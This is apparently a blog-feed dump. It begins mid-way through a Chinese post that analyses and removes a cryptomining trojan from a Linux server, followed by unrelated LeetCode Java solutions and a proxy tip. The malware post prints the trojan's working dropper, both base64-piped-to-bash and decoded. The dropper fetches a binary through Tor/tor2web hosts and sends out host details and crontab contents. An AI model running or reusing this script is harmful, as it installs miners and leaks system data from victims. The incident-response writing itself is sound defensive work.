vc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash 现在我们来仔细分析一下/root/.systemd-service.sh这个文件的内容（当然是解码之后的内容啦，没解码谁看得懂。。。），不过，要说声抱歉的是，shell我也不懂，就看懂个大概吧（大佬勿喷），大概就是监测挖矿进程是否在线，在线就一直连接socket，一直挖，一直挖，不在线就利用守护进程去启动它，然后还是一直挖，一直挖，一直挖。。。着实有点过分，怪不得那么吃资源，这简直丧心病狂。不得不提的是，脚本中有一个目录很值得我们注意一下，就是/tmp/.X11-unix/，这个就是挖矿进程和守护进程所在的地方，我们去看一下，执行 1ls -la /tmp/.X11-unix/ 可以看到，有三个文件，查看这三个文件（01、11、22）的内容可以看到是几个数字，功能如下： 01文件存放木马守护进程pid 11文件存放木马运行进程pid 22为一个空文件，功能暂时不清楚 分析就到这里了，下面是解决木马篇 干掉木马为了防止分析过程有所疏忽，有必要再次进行一下全局搜索，执行 12find / -iname systemd-service.shfind / -iname .systemd-service.sh 果然，我们有所遗漏，/opt/systemd-service.sh这就是我们之前没有发现的，现在我们来看一下它又是什么，执行 1cat /opt/systemd-service.sh 好吧，又是一个base64编码之后的东西，看起来，套路都一样呢？惊得我直呼一声好家伙 源文件： 1234#!/bin/bashexec &amp;&gt;/dev/nullecho nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVecho blA4YnlQVUdPd0tqVmZQWlpzcDVvY3RkWEhUV0d5UHFnVmVZODJ6VjFkZTZBWTB5ZEF0Z0VHbW8rSmF1bUVmVgpleGVjICY+L2Rldi9udWxsCmV4cG9ydCBQQVRIPSRQQVRIOiRIT01FOi9iaW46L3NiaW46L3Vzci9iaW46L3Vzci9zYmluOi91c3IvbG9jYWwvYmluOi91c3IvbG9jYWwvc2JpbgoKZD0kKGdyZXAgeDokKGlkIC11KTogL2V0Yy9wYXNzd2R8Y3V0IC1kOiAtZjYpCmM9JChlY2hvICJjdXJsIC00ZnNTTGtBLSAtbTIwMCIpCnQ9JChlY2hvICJ3dnp5djJucHRqdXhjcW9pYmVrbHhlc2U0Nmo0dW9uemFhcHd5bDZ3dmhka25qbHFsY29ldTdpZCIpCgpzb2NreigpIHsKbj0oZG9oLmRlZmF1bHRyb3V0ZXMuZGUgZG5zLmhvc3R1eC5uZXQgdW5jZW5zb3JlZC5sdXgxLmRucy5uaXhuZXQueHl6IGRucy5ydWJ5ZmlzaC5jbiBkbnMudHduaWMudHcgZG9oLmNlbnRyYWxldS5waS1kbnMuY29tIGRvaC5kbnMuc2IgZG9oLWZpLmJsYWhkbnMuY29tIGZpLmRvaC5kbnMuc25vcHl0YS5vcmcgZG5zLmZsYXR1c2xpZmlyLmlzIGRvaC5saSBkbnMuZGlnaXRhbGUtZ2VzZWxsc2NoYWZ0LmNoKQpwPSQoZWNobyAiZG5zLXF1ZXJ5P25hbWU9cmVsYXkudG9yMnNvY2tzLmluIikKcz0kKCRjIGh0dHBzOi8vJHtuWyQoKFJBTkRPTSUxMCkpXX0vJHAgfCBncmVwIC1vRSAiXGIoWzAtOV17MSwzfVwuKXszfVswLTldezEsM31cYiIgfHRyICcgJyAnXG4nfGdyZXAgLUV2IFsuXTB8c29ydCAtdVJ8aGVhZCAtbiAxKQp9CgpmZXhlKCkgewpmb3IgaSBpbiAuICRIT01FIC91c3IvYmluICRkIC92YXIvdG1wIDtkbyBlY2hvIGV4aXQgPiAkaS9pICYmIGNobW9kICt4ICRpL2kgJiYgY2QgJGkgJiYgLi9pICYmIHJtIC1mIGkgJiYgYnJlYWs7ZG9uZQp9Cgp1KCkgewpzb2NregpmPS9pbnQuJCh1bmFtZSAtbSkKeD0uLyQoZGF0ZXxtZDVzdW18Y3V0IC1mMSAtZC0pCnI9JChjdXJsIC00ZnNTTGsgY2hlY2tpcC5hbWF6b25hd3MuY29tfHxjdXJsIC00ZnNTTGsgaXAuc2IpXyQod2hvYW1pKV8kKHVuYW1lIC1tKV8kKHVuYW1lIC1uKV8kKGlwIGF8Z3JlcCAnaW5ldCAnfGF3ayB7J3ByaW50ICQyJ318bWQ1c3VtfGF3ayB7J3ByaW50ICQxJ30pXyQoY3JvbnRhYiAtbHxiYXNlNjQgLXcwKQokYyAteCBzb2NrczVoOi8vJHM6OTA1MCAkdC5vbmlvbiRmIC1vJHggLWUkciB8fCAkYyAkMSRmIC1vJHggLWUkcgpjaG1vZCAreCAkeDskeDtybSAtZiAkeAp9Cgpmb3IgaCBpbiB0b3Iyd2ViLmluIHRvcjJ3ZWIuaXQgb25pb24uZm91bmRhdGlvbiBvbmlvbi5jb20uZGUgb25pb24uc2ggdG9yMndlYi5zdSAKZG8KaWYgISBscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzOyB0aGVuCmZleGU7dSAkdC4kaApscyAvcHJvYy8kKGhlYWQgLW4gMSAvdG1wLy5YMTEtdW5peC8wMSkvc3RhdHVzIHx8IChjZCAvdG1wO3UgJHQuJGgpCmxzIC9wcm9jLyQoaGVhZCAtbiAxIC90bXAvLlgxMS11bml4LzAxKS9zdGF0dXMgfHwgKGNkIC9kZXYvc2htO3UgJHQuJGgpCmVsc2UKYnJlYWsKZmkKZG9uZQo=|base64 -d|bash 解码之后： 12345678910111213141516171819202122232425262728293031323334353637nP8byPUGOwKjVfPZZsp5octdXHTWGyPqgVeY82zV1de6AY0ydAtgEGmo+JaumEfVexec &amp;&gt;/dev/nullexport PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbind=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)c=$(echo &quot;curl -4fsSLkA- -m200&quot;)t=$(echo &quot;wvzyv2nptjuxcqoibeklxese46j4uonzaapwyl6wvhdknjlqlcoeu7id&quot;)sockz() &#123;n=(doh.defaultroutes.de dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org dns.flatuslifir.is doh.li dns.digitale-gesellschaft.ch)p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)s=$($c https://$&#123;n[$((RANDOM%10))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &apos; &apos; &apos;\n&apos;|grep -Ev [.]0|sort -uR|head -n 1)&#125;fexe() &#123;for i in . $HOME /usr/bin $d /var/tmp ;do echo exit &gt; $i/i &amp;&amp; chmod +x $i/i &amp;&amp; cd $i &amp;&amp; ./i &amp;&amp; rm -f i &amp;&amp; break;done&#125;u() &#123;sockzf=/int.$(uname -m)x=./$(date|md5sum|cut -f1 -d-)r=$(curl -4fsSLk checkip.amazonaws.com||curl -4fsSLk ip.sb)_$(whoami)_$(uname -m)_$(uname -n)_$(ip a|grep &apos;inet &apos;|awk &#123;&apos;print $2&apos;&#125;|md5sum|awk &#123;&apos;print $1&apos;&#125;)_$(crontab -l|base64 -w0)$c -x socks5h://$s:9050 $t.onion$f -o$x -e$r || $c $1$f -o$x -e$rchmod +x $x;$x;rm -f $x&#125;for h in tor2web.in tor2web.it onion.foundation onion.com.de onion.sh tor2web.su doif ! ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status; thenfexe;u $t.$hls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /tmp;u $t.$h)ls /proc/$(head -n 1 /tmp/.X11-unix/01)/status || (cd /dev/shm;u $t.$h)elsebreakfidone 好家伙，不看不知道，一看下一跳，跟之前那个文件一模一样，吓得我又不由自主的说了一句，好家伙 这里补充一点分析：之前我们只是用crontab -l，查看了定时任务，并没有找到定时任务的配置文件，而经验告诉我们，crontab的配置文件，通常在/etc/cron.d/下，还有，如果是root用户，在/var/spool/cron/crontabs/root文件中，于是我们分别执行 12ls -la /etc/cron.d/cat /var/spool/cron/crontabs/root 果然，看到了熟悉的0systemd-service 我们来看一下，它的内容，执行 1cat /etc/cron.d/0systemd-service 可以清晰的看到，它在定时的启动挖矿程序 好了，分析真的就到这里为止了，下面是解决木马篇 彻底干掉木马分析了一大堆，最关键的文件是： 1234/etc/cron.d/0systemd-service/var/spool/cron/crontabs/root/opt/systemd-service.sh/root/.systemd-service.sh 删掉这几个文件，然后停掉挖矿进程即可 1cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root 重启，验证 1reboot now 后续根据经验，我们可以知道，挖矿木马，通常还会修改我们的know_hosts文件和hosts文件，所以我们去验证一下，执行 1cat .ssh/known_hosts 可以看到，果然写了一个公钥到know_hosts文件 可以执行，echo &gt; .ssh/known_hosts，修复它 我们在看一下hosts文件，执行 1cat /etc/hosts 看起来并没有修改 当然，也可以利用木马的特征，故意的制造一些混淆文件，防止再次感染，当然，也不是绝对有效的，安全与反安全，从来就没有高低之分，有的只是技术人员的能力差别而已 附上防止再次感染的命令 1234mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root 总结：解决挖矿木马，并防止感染，只需要两步： 1cat /tmp/.X11-unix/01 |xargs kill -9 &amp;&amp; cat /tmp/.X11-unix/11 |xargs kill -9 &amp;&amp; rm -rf /etc/cron.d/0systemd-service &amp;&amp; rm -rf /opt/systemd-service.sh &amp;&amp; rm -rf /root/.systemd-service.sh &amp;&amp; rm -rf /var/spool/cron/crontabs/root 1234mkdir /etc/cron.d/0systemd-service &amp;&amp; chmod 000 /etc/cron.d/0systemd-service &amp;&amp; chattr -i /etc/cron.d/0systemd-service &amp;&amp;mkdir /opt/systemd-service.sh &amp;&amp; chmod 000 /opt/systemd-service.sh &amp;&amp; chattr -i /opt/systemd-service.sh &amp;&amp;mkdir /root/.systemd-service.sh &amp;&amp; chmod 000 /root/.systemd-service.sh &amp;&amp; chattr -i /root/.systemd-service.sh &amp;&amp; mkdir /var/spool/cron/crontabs/root &amp;&amp; chmod 000 /var/spool/cron/crontabs/root &amp;&amp; chattr -i /var/spool/cron/crontabs/root 本文完。。。看到这里，也说明你很有毅力和探索欲，如果觉得我写的还不错，请打赏支持我，毕竟创作不易，谢谢大家]]></content>
      <categories>
        <category>linux</category>
        <category>ubantu</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>挖矿木马</tag>
        <tag>服务器</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/28]]></title>
    <url>%2Fposts%2F54d6de5f%2F</url>
    <content type="text"><![CDATA[题目：173. 二叉搜索树迭代器难度：中等 BSTIterator BSTIterator(TreeNode root) 初始化 BSTIterator 类的一个对象。BST 的根节点 root 会作为构造函数的一部分给出。指针应初始化为一个不存在于 BST 中的数字，且该数字小于 BST 中的任何元素。 boolean hasNext() 如果向指针右侧遍历存在数字，则返回 true ；否则返回 false 。 int next()将指针向右移动，然后返回指针处的数字。 注意，指针初始化为一个不存在于 BST 中的数字，所以对 next() 的首次调用将返回 BST 中的最小元素。 你可以假设 next() 调用总是有效的，也就是说，当调用 next() 时，BST 的中序遍历中至少存在一个下一个数字。 示例： 1234567891011121314151617输入[&quot;BSTIterator&quot;, &quot;next&quot;, &quot;next&quot;, &quot;hasNext&quot;, &quot;next&quot;, &quot;hasNext&quot;, &quot;next&quot;, &quot;hasNext&quot;, &quot;next&quot;, &quot;hasNext&quot;][[[7, 3, 15, null, null, 9, 20]], [], [], [], [], [], [], [], [], []]输出[null, 3, 7, true, 9, true, 15, true, 20, false]解释BSTIterator bSTIterator = new BSTIterator([7, 3, 15, null, null, 9, 20]);bSTIterator.next(); // 返回 3bSTIterator.next(); // 返回 7bSTIterator.hasNext(); // 返回 TruebSTIterator.next(); // 返回 9bSTIterator.hasNext(); // 返回 TruebSTIterator.next(); // 返回 15bSTIterator.hasNext(); // 返回 TruebSTIterator.next(); // 返回 20bSTIterator.hasNext(); // 返回 False 提示： 树中节点的数目在范围 [1, 105] 内 0 &lt;= Node.val &lt;= 106 最多调用 105 次 hasNext 和 next 操作 进阶： 你可以设计一个满足下述条件的解决方案吗？next() 和 hasNext() 操作均摊时间复杂度为 O(1) ，并使用 O(h) 内存。其中 h 是树的高度。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/binary-search-tree-iterator/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 其实就是维护一个二叉搜索树的中序遍历序列，有递归和迭代两种写法 解题代码递归 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class BSTIterator &#123; Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); public BSTIterator(TreeNode root) &#123; dfs(root); &#125; private void dfs(TreeNode root) &#123; if (root == null) &#123; return; &#125; dfs(root.right); s.push(root.val); dfs(root.left); &#125; public int next() &#123; return s.pop(); &#125; public boolean hasNext() &#123; return !s.isEmpty(); &#125;&#125;/** * Your BSTIterator object will be instantiated and called as such: * BSTIterator obj = new BSTIterator(root); * int param_1 = obj.next(); * boolean param_2 = obj.hasNext(); */ 迭代 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode() &#123;&#125; * TreeNode(int val) &#123; this.val = val; &#125; * TreeNode(int val, TreeNode left, TreeNode right) &#123; * this.val = val; * this.left = left; * this.right = right; * &#125; * &#125; */class BSTIterator &#123; Stack&lt;TreeNode&gt; s = new Stack&lt;&gt;(); TreeNode cur = null; public BSTIterator(TreeNode root) &#123; cur = root; &#125; public int next() &#123; while (cur != null) &#123; s.push(cur); cur = cur.left; &#125; cur = s.pop(); int ans = cur.val; cur = cur.right; return ans; &#125; public boolean hasNext() &#123; return cur != null || !s.isEmpty(); &#125;&#125;/** * Your BSTIterator object will be instantiated and called as such: * BSTIterator obj = new BSTIterator(root); * int param_1 = obj.next(); * boolean param_2 = obj.hasNext(); */]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>栈</tag>
        <tag>迭代器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[终端使用代理]]></title>
    <url>%2Fposts%2F39ffeca3%2F</url>
    <content type="text"><![CDATA[临时windows终端 1set all_proxy=socks5://host:port linux终端 1export all_proxy=socks5://host:port 永久写入配置文件中即可]]></content>
      <categories>
        <category>爬虫</category>
        <category>代理</category>
      </categories>
      <tags>
        <tag>终端</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/27]]></title>
    <url>%2Fposts%2Fc469c3ce%2F</url>
    <content type="text"><![CDATA[题目：61. 旋转链表难度：中等 给你一个链表的头节点 head ，旋转链表，将链表每个节点向右移动 k 个位置。 示例 1： 12输入：head = [1,2,3,4,5], k = 2输出：[4,5,1,2,3] 示例 2： 12输入：head = [0,1,2], k = 4输出：[2,0,1] 提示： 链表中节点的数目在范围 [0, 500] 内 -100 &lt;= Node.val &lt;= 100 0 &lt;= k &lt;= 2 * 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/rotate-list/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 模拟过程，或者闭合为环，断掉合适的位置即可 解题代码双指针，模拟过程 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode rotateRight(ListNode head, int k) &#123; if (head == null || k == 0) &#123; return head; &#125; ListNode vHead = new ListNode(-101,head); ListNode cur = head; int len = 0; while (cur != null) &#123; len++; cur = cur.next; &#125; k %= len; while (k-- &gt; 0) &#123; ListNode right = vHead.next; while (right != null &amp;&amp; right.next != null) &#123; if (right.next.next == null) &#123; break; &#125; right = right.next; &#125; ListNode node = right.next; right.next = null; ListNode left = vHead.next; node.next = left; vHead.next = node; &#125; return vHead.next; &#125;&#125; 闭合为环 再断开 1234567891011121314151617181920212223242526272829303132333435363738/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode rotateRight(ListNode head, int k) &#123; if (head == null || k == 0) &#123; return head; &#125; ListNode vHead = new ListNode(-101,head); ListNode cur = head; int len = 0; while (cur != null) &#123; len++; if (cur.next == null) &#123; break; &#125; cur = cur.next; &#125; cur.next = vHead.next; k = len - k % len; while (k-- &gt; 0) &#123; cur = cur.next; &#125; ListNode node = cur.next; cur.next = null; return node; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/26]]></title>
    <url>%2Fposts%2Fb36ef358%2F</url>
    <content type="text"><![CDATA[题目：83. 删除排序链表中的重复元素难度：简单 存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除所有重复的元素，使每个元素 只出现一次 。 返回同样按升序排列的结果链表。 示例 1： 12输入：head = [1,1,2]输出：[1,2] 示例 2： 12输入：head = [1,1,2,3,3]输出：[1,2,3] 提示： 链表中节点数目在范围 [0, 300] 内 -100 &lt;= Node.val &lt;= 100 题目数据保证链表已经按升序排列 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 假想有一个新的链表，利用原链表有序这个特点，在遍历原链表的过程中，只把比新链表的最后一个节点大的节点加入新链表 解题代码迭代 1234567891011121314151617181920212223242526272829/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode deleteDuplicates(ListNode head) &#123; if (head == null) &#123; return head; &#125; ListNode vHead = new ListNode(-101,head); ListNode cur = head; ListNode nCur = cur; while (cur != null) &#123; if (cur.val &gt; nCur.val) &#123; nCur.next = cur; nCur = nCur.next; &#125; cur = cur.next; &#125; nCur.next = null; return vHead.next; &#125;&#125; 递归写法，递归函数的定义是，返回第一个比前一个节点大的下一个节点 1234567891011121314151617181920212223242526/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode deleteDuplicates(ListNode head) &#123; if (head == null) &#123; return head; &#125; ListNode cur = head.next; if (cur == null) &#123; return head; &#125; while (cur != null &amp;&amp; cur.val &lt;= head.val) &#123; cur = cur.next; &#125; head.next = deleteDuplicates(cur); return head; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/25]]></title>
    <url>%2Fposts%2F2a67a2e2%2F</url>
    <content type="text"><![CDATA[题目：82. 删除排序链表中的重复元素 II难度：中等 存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除链表中所有存在数字重复情况的节点，只保留原始链表中 没有重复出现 的数字。 返回同样按升序排列的结果链表。 示例 1： 12输入：head = [1,2,3,3,4,4,5]输出：[1,2,5] 示例 2： 12输入：head = [1,1,1,2,3]输出：[2,3] 提示： 链表中节点数目在范围 [0, 300] 内 -100 &lt;= Node.val &lt;= 100 题目数据保证链表已经按升序排列 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 一种比较容易想到的思路，就是，遍历一次，将不重复的节点保存到一个容器，然后拼成新链表，时空复杂度都要大一些，但是比较好写；另一种思路就是直接在原来的链表的基础上做修改，因为题目给出了链表有序这个条件，基于此，我们可以判定，重复的节点，一定是连续的 解题代码基于容器，双端队列，这里其实也稍微利用了一下链表有序这个特点 1234567891011121314151617181920212223242526272829303132333435363738394041/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode deleteDuplicates(ListNode head) &#123; ListNode vHead = new ListNode(-101,head); Deque&lt;ListNode&gt; q = new LinkedList&lt;&gt;(); q.addFirst(vHead); ListNode cur = vHead.next; while (cur != null) &#123; if (cur.val &gt; q.peekLast().val) &#123; q.addLast(cur); cur = cur.next; &#125; else &#123; while (cur != null &amp;&amp; cur.val &lt;= q.peekLast().val) &#123; cur = cur.next; &#125; q.removeLast(); &#125; &#125; cur = vHead; q.removeFirst(); while (!q.isEmpty()) &#123; ListNode p = q.removeFirst(); cur.next = p; cur = cur.next; &#125; cur.next = null; return vHead.next; &#125;&#125; 链表原地修改 123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode() &#123;&#125; * ListNode(int val) &#123; this.val = val; &#125; * ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125; * &#125; */class Solution &#123; public ListNode deleteDuplicates(ListNode head) &#123; ListNode vHead = new ListNode(-101,head); ListNode cur = vHead.next; ListNode c = vHead; while (cur != null) &#123; ListNode next = cur.next; boolean flag = true; while (next != null &amp;&amp; next.val == cur.val) &#123; next = next.next; flag = false; &#125; if (flag) &#123; c.next = cur; c = c.next; &#125; cur = next; &#125; if (c != null) &#123; c.next = null; &#125; return vHead.next; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/24]]></title>
    <url>%2Fposts%2F5d609274%2F</url>
    <content type="text"><![CDATA[题目：456. 132模式难度：中等 给你一个整数数组 nums ，数组中共有 n 个整数。 132 模式的子序列 由三个整数 nums[i]、nums[j] 和 nums[k] 组成，并同时满足：i &lt; j &lt; k 和 nums[i] &lt; nums[k] &lt; nums[j] 。 如果 nums 中存在 132 模式的子序列 ，返回 true ；否则，返回 false 。 进阶： 很容易想到时间复杂度为 O(n^2) 的解决方案，你可以设计一个时间复杂度为 O(n logn) 或 O(n) 的解决方案吗？ 示例 1： 123输入：nums = [1,2,3,4]输出：false解释：序列中不存在 132 模式的子序列。 示例 2： 123输入：nums = [3,1,4,2]输出：true解释：序列中有 1 个 132 模式的子序列： [1, 4, 2] 。 示例 3： 123输入：nums = [-1,3,2,0]输出：true解释：序列中有 3 个 132 模式的的子序列：[-1, 3, 2]、[-1, 3, 0] 和 [-1, 2, 0] 。 提示： n == nums.length 1 &lt;= n &lt;= 104 -109 &lt;= nums[i] &lt;= 109 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/132-pattern/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 最容易想到的思路应该是枚举1 2 3，这样时间复杂度到达了O(n ^ 3)，在数据规模为10 ^ 4的情况下，一定是会超时的；然后考虑优化一下。132这种模式，我们可以考虑枚举3，那么1和2如何确定呢，如果从左往右遍历的话，1可以确定为左边比3小的最小的数，这样就不需要枚举1的情况了，2可以用暴力枚举去确定，复杂度降为O(n ^ 2)，在10 ^ 4这个规模的数据量下，好像也能过；然后我们再考虑优化一下，还是枚举3，前面考虑了从左往右遍历，可以很方便的确定1，现在我们换一个方向，从右往左遍历，怎么去确定1和2呢，1还是很好确定，因为我们可以预处理，用一个数组去缓存当前位置左边比它小的最小的数字，2可以确定为右边，比3小的最大的数字，因此我们可以用单调栈去处理 解题代码枚举1 2 3 ，超时 123456789101112131415161718192021class Solution &#123; public boolean find132pattern(int[] nums) &#123; for (int i = 0;i &lt; nums.length;i++) &#123; for (int j = i + 1;j &lt; nums.length;j++) &#123; if (judge(nums,i,j)) &#123; return true; &#125; &#125; &#125; return false; &#125; private boolean judge(int[] nums,int i,int j) &#123; for (int k = j + 1;k &lt; nums.length;k++) &#123; if (nums[i] &lt; nums[k] &amp;&amp; nums[k] &lt; nums[j]) &#123; return true; &#125; &#125; return false; &#125;&#125; 枚举 3 2，AC 123456789101112131415class Solution &#123; public boolean find132pattern(int[] nums) &#123; int n = nums.length; int numsi = nums[0]; for (int j = 1;j &lt; n;j++) &#123; for (int k = n - 1;k &gt; j;k--) &#123; if (numsi &lt; nums[k] &amp;&amp; nums[k] &lt; nums[j]) &#123; return true; &#125; &#125; numsi = Math.min(numsi,nums[j]); &#125; return false; &#125;&#125; 枚举3 单调栈优化搜索2，AC 1234567891011121314151617181920212223242526class Solution &#123; public boolean find132pattern(int[] nums) &#123; int n = nums.length; int[] leftMin = new int[n]; Arrays.fill(leftMin,Integer.MAX_VALUE); for (int i = 1;i &lt; n;i++) &#123; leftMin[i] = Math.min(leftMin[i - 1],nums[i - 1]); &#125; Stack&lt;Integer&gt; s = new Stack&lt;&gt;(); s.push(nums[n - 1]); for (int j = n - 2;j &gt;= 0;j--) &#123; int numsk = Integer.MAX_VALUE; while (!s.isEmpty() &amp;&amp; nums[j] &gt; s.peek()) &#123; numsk = s.pop(); &#125; if (leftMin[j] &lt; numsk &amp;&amp; numsk &lt; nums[j]) &#123; return true; &#125; s.push(nums[j]); &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>单调栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2021/3/23]]></title>
    <url>%2Fposts%2Fc30407d7%2F</url>
    <content type="text"><![CDATA[题目：341. 扁平化嵌套列表迭代器难度：中等 给你一个嵌套的整型列表。请你设计一个迭代器，使其能够遍历这个整型列表中的所有整数。 列表中的每一项或者为一个整数，或者是另一个列表。其中列表的元素也可能是整数或是其他列表。 示例 1: 123输入: [[1,1],2,[1,1]]输出: [1,1,2,1,1]解释: 通过重复调用 next 直到 hasNext 返回 false，next 返回的元素的顺序应该是: [1,1,2,1,1]。 示例 2: 123输入: [1,[4,[6]]]输出: [1,4,6]解释: 通过重复调用 next 直到 hasNext 返回 false，next 返回的元素的顺序应该是: [1,4,6]。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/flatten-nested-list-iterator/著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 水题 好像没什么好说的 解题代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950/** * // This is the interface that allows for creating nested lists. * // You should not implement it, or speculate about its implementation * public interface NestedInteger &#123; * * // @return true if this NestedInteger holds a single integer, rather than a nested list. * public boolean isInteger(); * * // @return the single integer that this NestedInteger holds, if it holds a single integer * // Return null if this NestedInteger holds a nested list * public Integer getInteger(); * * // @return the nested list that this NestedInteger holds, if it holds a nested list * // Return null if this NestedInteger holds a single integer * public List&lt;NestedInteger&gt; getList(); * &#125; */public class NestedIterator implements Iterator&lt;Integer&gt; &#123; Queue&lt;Integer&gt; q = new LinkedList&lt;&gt;(); public NestedIterator(List&lt;NestedInteger&gt; nestedList) &#123; init(nestedList); &#125; void init(List&lt;NestedInteger&gt; nestedList) &#123; for (NestedInteger n : nestedList) &#123; if (n.isInteger()) &#123; q.add(n.getInteger()); &#125; else &#123; init(n.getList()); &#125; &#125; &#125; @Override public Integer next() &#123; return q.poll(); &#125; @Override public boolean hasNext() &#123; return !q.isEmpty(); &#125;&#125;/** * Your NestedIterator object will be instantiated and called as such: * NestedIterator i = new 